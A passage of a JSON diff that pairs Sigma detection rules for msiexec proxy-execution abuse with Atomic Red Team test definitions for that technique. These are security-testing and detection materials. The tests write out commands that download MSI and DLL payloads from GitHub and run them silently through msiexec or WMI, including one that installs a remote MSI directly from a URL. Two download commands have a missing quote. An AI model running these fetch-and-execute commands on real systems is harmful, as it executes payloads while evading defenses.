+                            "raw": "author: frack113\ndate: 2022/01/16\ndescription: 'Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\n\n  Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly\n  associated with executing installation packages (.msi)\n\n  '\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_apple:\n    CommandLine|contains:\n    - \\MsiExec.exe\" /Y \"C:\\Program Files\\Bonjour\\mdnsNSP.dll\n    - \\MsiExec.exe\" /Y \"C:\\Program Files (x86)\\Bonjour\\mdnsNSP.dll\n    - \\MsiExec.exe\" /Y \"C:\\Program Files (x86)\\Apple Software Update\\ScriptingObjectModel.dll\n    - \\MsiExec.exe\" /Y \"C:\\Program Files (x86)\\Apple Software Update\\SoftwareUpdateAdmin.dll\n    - \\MsiExec.exe\" /Y \"C:\\Windows\\CCM\\\n    - \\MsiExec.exe\" /Y C:\\Windows\\CCM\\\n    - \\MsiExec.exe\" -Y \"C:\\Program Files\\Bonjour\\mdnsNSP.dll\n    - \\MsiExec.exe\" -Y \"C:\\Program Files (x86)\\Bonjour\\mdnsNSP.dll\n    - \\MsiExec.exe\" -Y \"C:\\Program Files (x86)\\Apple Software Update\\ScriptingObjectModel.dll\n    - \\MsiExec.exe\" -Y \"C:\\Program Files (x86)\\Apple Software Update\\SoftwareUpdateAdmin.dll\n    - \\MsiExec.exe\" -Y \"C:\\Windows\\CCM\\\n    - \\MsiExec.exe\" -Y C:\\Windows\\CCM\\\n  selection:\n    CommandLine|contains:\n    - ' /y'\n    - ' -y'\n    Image|endswith: \\msiexec.exe\nfalsepositives:\n- Legitimate script\nid: 6f4191bb-912b-48a8-9ce7-682769541e6d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/08\nreferences:\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n- https://twitter.com/_st0pp3r_/status/1583914515996897281\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.007\ntitle: Suspicious Msiexec Execute Arbitrary DLL\n",
+                            "sigma:id": "6f4191bb-912b-48a8-9ce7-682769541e6d",
+                            "title": "Suspicious Msiexec Execute Arbitrary DLL",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "84f52741-8834-4a8c-a413-2eb2269aa6c8",
+                        "lookup_data": {
+                            "description": "Detects MsiExec loading a DLL and calling its DllUnregisterServer function",
+                            "raw": "author: frack113\ndate: 2022/04/24\ndescription: Detects MsiExec loading a DLL and calling its DllUnregisterServer function\ndetection:\n  condition: all of selection_*\n  selection_dll:\n    CommandLine|contains: .dll\n  selection_msi:\n    CommandLine|contains:\n    - ' /z '\n    - ' -z '\n    Image|endswith: \\msiexec.exe\nfalsepositives:\n- Unknown\nid: 84f52741-8834-4a8c-a413-2eb2269aa6c8\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/23\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\n- https://twitter.com/_st0pp3r_/status/1583914515996897281\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.007\ntitle: Suspicious Msiexec Load DLL\n",
+                            "sigma:id": "84f52741-8834-4a8c-a413-2eb2269aa6c8",
+                            "title": "Suspicious Msiexec Load DLL",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "91109523-17f0-4248-a800-f81d9e7c081d",
+                        "lookup_data": {
+                            "description": "Detects the execution of an MSI file using PowerShell and the WMI Win32_Product class",
+                            "raw": "author: frack113\ndate: 2022/04/24\ndescription: Detects the execution of an MSI file using PowerShell and the WMI Win32_Product\n  class\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - 'Invoke-CimMethod '\n    - '-ClassName '\n    - 'Win32_Product '\n    - '-MethodName '\n    - .msi\nfalsepositives:\n- Unknown\nid: 91109523-17f0-4248-a800-f81d9e7c081d\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.007\ntitle: PowerShell WMI Win32_Product Install MSI\n",
+                            "sigma:id": "91109523-17f0-4248-a800-f81d9e7c081d",
+                            "title": "PowerShell WMI Win32_Product Install MSI",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4a2a2c3e-209f-4d01-b513-4155a540b469",
+                        "lookup_data": {
+                            "description": "Adversaries may abuse msiexec.exe to proxy the execution of malicious payloads",
+                            "raw": "author: frack113\ndate: 2022/04/16\ndescription: Adversaries may abuse msiexec.exe to proxy the execution of malicious\n  payloads\ndetection:\n  condition: selection and not 1 of filter*\n  filter_splunk_ufw:\n    CommandLine|contains: C:\\Program Files\\SplunkUniversalForwarder\\bin\\\n    Image|endswith: :\\Windows\\System32\\cmd.exe\n  filter_vs:\n  - CommandLine|contains: \\DismFoDInstall.cmd\n  - ParentCommandLine|contains|all:\n    - '\\MsiExec.exe -Embedding '\n    - Global\\MSI0000\n  selection:\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\cmd.exe\n    ParentCommandLine|contains|all:\n    - MsiExec.exe\n    - '-Embedding '\nfalsepositives:\n- Unknown\nid: 4a2a2c3e-209f-4d01-b513-4155a540b469\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\nstatus: experimental\ntags:\n- attack.t1218.007\n- attack.defense_evasion\ntitle: Suspicious MsiExec Embedding Parent\n",
+                            "sigma:id": "4a2a2c3e-209f-4d01-b513-4155a540b469",
+                            "title": "Suspicious MsiExec Embedding Parent",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5594e67a-7f92-4a04-b65d-1a42fd824a60",
+                        "lookup_data": {
+                            "description": "Detects installation of a remote msi file from web.",
+                            "raw": "author: Stamatis Chatzimangou\ndate: 2022/10/23\ndescription: Detects installation of a remote msi file from web.\ndetection:\n  condition: selection\n  selection:\n    Data|contains: ://\n    EventID:\n    - 1040\n    - 1042\n    Provider_Name: MsiInstaller\nfalsepositives:\n- Unknown\nid: 5594e67a-7f92-4a04-b65d-1a42fd824a60\nlevel: medium\nlogsource:\n  product: windows\n  service: application\nmodified: 2022/10/23\nreferences:\n- https://twitter.com/_st0pp3r_/status/1583922009842802689\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1218\n- attack.t1218.007\ntitle: MSI Installation From Web\n",
+                            "sigma:id": "5594e67a-7f92-4a04-b65d-1a42fd824a60",
+                            "title": "MSI Installation From Web",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1218.007",
+                "display_name": "Signed Binary Proxy Execution: Msiexec",
+                "atomic_tests": [
+                    {
+                        "name": "Msiexec.exe - Execute Local MSI file with embedded JScript",
+                        "auto_generated_guid": "a059b6c4-e7d6-4b2e-bcd7-9b2b33191a04",
+                        "description": "Executes an MSI containing embedded JScript code using msiexec.exe\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "msi_payload": {
+                                "description": "MSI file to execute",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi"
+                            },
+                            "msi_exe": {
+                                "description": "MSIExec File Path",
+                                "type": "path",
+                                "default": "c:\\windows\\system32\\msiexec.exe"
+                            },
+                            "action": {
+                                "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
+                                "type": "string",
+                                "default": "i"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
+                                "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Msiexec.exe - Execute Local MSI file with embedded VBScript",
+                        "auto_generated_guid": "8d73c7b0-c2b1-4ac1-881a-4aa644f76064",
+                        "description": "Executes an MSI containing embedded VBScript code using msiexec.exe\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "msi_payload": {
+                                "description": "MSI file to execute",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi"
+                            },
+                            "msi_exe": {
+                                "description": "MSIExec File Path",
+                                "type": "path",
+                                "default": "c:\\windows\\system32\\msiexec.exe"
+                            },
+                            "action": {
+                                "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
+                                "type": "string",
+                                "default": "i"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
+                                "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"#{msi_payload}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Msiexec.exe - Execute Local MSI file with an embedded DLL",
+                        "auto_generated_guid": "628fa796-76c5-44c3-93aa-b9d8214fd568",
+                        "description": "Executes an MSI containing an embedded DLL using msiexec.exe\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "msi_payload": {
+                                "description": "MSI file to execute",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi"
+                            },
+                            "msi_exe": {
+                                "description": "MSIExec File Path",
+                                "type": "path",
+                                "default": "c:\\windows\\system32\\msiexec.exe"
+                            },
+                            "action": {
+                                "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
+                                "type": "string",
+                                "default": "i"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
+                                "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Msiexec.exe - Execute Local MSI file with an embedded EXE",
+                        "auto_generated_guid": "ed3fa08a-ca18-4009-973e-03d13014d0e8",
+                        "description": "Executes an MSI containing an embedded EXE using msiexec.exe\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "msi_payload": {
+                                "description": "MSI file to execute",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi"
+                            },
+                            "msi_exe": {
+                                "description": "MSIExec File Path",
+                                "type": "path",
+                                "default": "c:\\windows\\system32\\msiexec.exe"
+                            },
+                            "action": {
+                                "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
+                                "type": "string",
+                                "default": "i"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
+                                "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"#{msi_payload}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "WMI Win32_Product Class - Execute Local MSI file with embedded JScript",
+                        "auto_generated_guid": "882082f0-27c6-4eec-a43c-9aa80bccdb30",
+                        "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "msi_payload": {
+                                "description": "MSI file to execute",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi"
+                            },
+                            "action": {
+                                "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
+                                "type": "string",
+                                "default": "Install"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
+                                "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WMI Win32_Product Class - Execute Local MSI file with embedded VBScript",
+                        "auto_generated_guid": "cf470d9a-58e7-43e5-b0d2-805dffc05576",
+                        "description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "msi_payload": {
+                                "description": "MSI file to execute",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi"
+                            },
+                            "action": {
+                                "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
+                                "type": "string",
+                                "default": "Install"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
+                                "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"#{msi_payload}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WMI Win32_Product Class - Execute Local MSI file with an embedded DLL",
+                        "auto_generated_guid": "32eb3861-30da-4993-897a-42737152f5f8",
+                        "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "msi_payload": {
+                                "description": "MSI file to execute",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi"
+                            },
+                            "action": {
+                                "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
+                                "type": "string",
+                                "default": "Install"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
+                                "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WMI Win32_Product Class - Execute Local MSI file with an embedded EXE",
+                        "auto_generated_guid": "55080eb0-49ae-4f55-a440-4167b7974f79",
+                        "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "msi_payload": {
+                                "description": "MSI file to execute",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi"
+                            },
+                            "action": {
+                                "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
+                                "type": "string",
+                                "default": "Install"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
+                                "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"#{msi_payload}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Msiexec.exe - Execute the DllRegisterServer function of a DLL",
+                        "auto_generated_guid": "0106ffa5-fab6-4c7d-82e3-e6b8867d5e5d",
+                        "description": "Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "dll_payload": {
+                                "description": "DLL to execute that has an implemented DllRegisterServer function",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll"
+                            },
+                            "msi_exe": {
+                                "description": "MSIExec File Path",
+                                "type": "path",
+                                "default": "c:\\windows\\system32\\msiexec.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The DLL must exist on disk at specified location (#{dll_payload})\n",
+                                "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "#{msi_exe} /y \"#{dll_payload}\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Msiexec.exe - Execute the DllUnregisterServer function of a DLL",
+                        "auto_generated_guid": "ab09ec85-4955-4f9c-b8e0-6851baf4d47f",
+                        "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "dll_payload": {
+                                "description": "DLL to execute that has an implemented DllUnregisterServer function",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll"
+                            },
+                            "msi_exe": {
+                                "description": "MSIExec File Path",
+                                "type": "path",
+                                "default": "c:\\windows\\system32\\msiexec.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The DLL must exist on disk at specified location (#{dll_payload})\n",
+                                "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "#{msi_exe} /z \"#{dll_payload}\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Msiexec.exe - Execute Remote MSI file",
+                        "auto_generated_guid": "44a4bedf-ffe3-452e-bee4-6925ab125662",
+                        "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "msi_payload": {
+                                "description": "MSI file to execute",
+                                "type": "string",
+                                "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"
+                            },
+                            "msi_exe": {
+                                "description": "MSIExec File Path",
+                                "type": "path",
+                                "default": "c:\\windows\\system32\\msiexec.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "#{msi_exe} /q /i \"#{msi_payload}\"\n",
+                            "name": "command_prompt"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 14:16:05"
+}
